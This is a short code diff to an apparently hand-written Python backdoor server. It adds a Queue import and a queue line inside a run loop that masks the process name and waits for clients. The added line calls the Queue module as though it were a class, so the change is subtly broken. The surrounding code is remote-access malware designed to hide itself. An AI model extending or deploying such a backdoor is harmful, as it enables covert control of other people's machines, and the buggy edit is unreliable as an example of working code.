@@ -4,6 +4,7 @@ from setproctitle import setproctitle, getproctitle
 
 import command
 import Crypto.Cipher
+import Queue
 import struct
 import sys
 import time
@@ -143,6 +144,9 @@ class BackdoorServer(object):
     def run(self):
         """Runs in a loop listening for clients and serving their requests."""
         self.mask_process()
+
+        queue = Queue()        
+
         while True:
             print("Waiting for client...")
             
